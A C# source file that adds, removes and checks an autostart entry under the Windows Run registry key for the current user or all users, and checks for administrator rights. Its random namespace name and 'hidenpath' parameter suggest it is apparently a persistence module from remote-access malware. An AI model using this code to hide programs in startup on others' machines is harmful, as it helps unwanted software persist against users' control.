using Microsoft.Win32;
using System;
using System.Linq;
using System.Security.Principal;


namespace RArAtiTdkA
{
    public class StartUpManager
    {
        private static string REG_KEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        private static string NAME = "RArAtiTdkA";

        public static void AddApplicationToCurrentUserStartup(String hidenpath)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_KEY, true))
            {
                key.SetValue(NAME, hidenpath);
            }
        }


        public static void AddApplicationToAllUserStartup(String hidenpath)
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(REG_KEY, true))
            {
                key.SetValue(NAME, hidenpath);
            }
        }


        public static void RemoveApplicationFromCurrentUserStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_KEY, true))
            {
                key.DeleteValue(NAME, false);
            }
        }


        public static void RemoveApplicationFromAllUserStartup()
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(REG_KEY, true))
            {
                key.DeleteValue(NAME, false);
            }
        }

        public static String checkExistanceFromAllUserStartup()
        {
            RegistryKey winLogonKey = Registry.LocalMachine.OpenSubKey(REG_KEY, true);
            return (winLogonKey.GetValueNames().ToList().FirstOrDefault(stringToCheck => stringToCheck.Contains(NAME)));
        }

        public static String checkExistanceFromCurrentUserStartup()
        {
            RegistryKey winLogonKey = Registry.CurrentUser.OpenSubKey(REG_KEY, true);
            return (winLogonKey.GetValueNames().ToList().FirstOrDefault(stringToCheck => stringToCheck.Contains(NAME)));
        }

        public static bool IsUserAdministrator()
        {
            bool isAdmin;

            try
            {
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            catch (UnauthorizedAccessException ex)
            {
                isAdmin = false;
            }

            catch (Exception ex)
            {
                isAdmin = false;
            }

            return isAdmin;
        }
    }
}